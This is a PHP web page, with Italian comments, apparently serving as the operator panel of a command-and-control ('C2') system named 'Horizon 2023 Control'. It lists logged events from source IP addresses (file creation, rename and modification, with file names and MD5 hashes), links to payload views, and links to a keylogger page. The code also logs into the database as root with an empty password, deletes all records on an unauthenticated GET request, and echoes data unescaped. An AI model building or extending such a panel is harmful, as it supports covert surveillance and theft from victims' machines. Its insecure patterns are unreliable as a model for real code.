
<html>

<head>
<title>.:: Horizon 2023 Control v.0.1 ::.</title>
<link rel="stylesheet" href="main.css">
</head>

<body>
<table id="main" width="100%" cellpadding="1" cellspacing="1">
<tr>
	<td colspan="7" align="center"><h3>C2</h3></td>
</tr>

<tr>
	<td align="center">Indirizzo IP</td>
	<td align="center">Timestamp</td>
    <td align="center">ID Log</td>
	<td align="center">Nome file</td>
	<td align="center">Hash</td>
	<td>&nbsp;</td>
</tr>
<tr>
	<td colspan="7">&nbsp;</td>
</tr>

<?php


function parsingFileName($m) {	
  $i = 5;
  $f = strpos($m, 'MD5:',0)-6; 
  return trim(substr($m,$i,$f));
}

function parsingHash($m) {
  $i = strpos($m, 'MD5:')+5;
  $f = 32; //MD5
  return trim(substr($m,$i,$f));  
}


//utente per db c2 da settare
$servername = "localhost";
$username = "root";
$password = "";

$conn = new mysqli($servername, $username, $password);
if ($conn->connect_error) {
  die("Connection failed: " . $conn->connect_error);
}

//se request valorizzato
//1 viene memorizzato
//2 generata pagina con lettura payload
//3 parsing nome file, hash, payload e link per lettura raw di tutto il log e download del base64 convertito


if( isset($_REQUEST["do"]) && $_REQUEST["do"]=="D" ) {
	$sql = "DELETE FROM c2.log_monitor";
	$result = $conn->query($sql);
}





//elenco ricorsivo dei record

$sql = "SELECT * FROM c2.log_monitor order by timestamp DESC";
$result = $conn->query($sql);


if ($result->num_rows > 0) {
  while($row = $result->fetch_assoc()) {	
	$filename =  parsingFileName($row["event_full"]);
	$hash = parsingHash($row["event_full"]);
	
	echo "<tr><td>" . $row["ip_address_source"] . "</td><td>" . $row["timestamp"] . "</td><td>" . $row["id_log"] . "</td><td>" . $filename . "</td><td><a target='_blank' href='https://www.virustotal.com/gui/search/" . $hash . "'>" . $hash . "</a></td><td align='center'><a target='_blank' href='apri.php?id=" . $row["id"] . "'>Apri</a></td></tr>";
  }
} 



 
?>

<tr>
	<td colspan="7">ID Log 169 -> Creazione | 269 -> Rinomina | 369 -> Modifica</td>
</tr>
<tr>
	<td colspan="7">Record totali: <?php echo $result->num_rows; ?>&nbsp;|&nbsp;<a href="index.php">Aggiorna</a>&nbsp;|&nbsp;<a href="index.php?do=D">Svuota</a>&nbsp;|&nbsp;<a href="key.php">Keylogger</a></td>
</tr>



</table>
</body>
</html>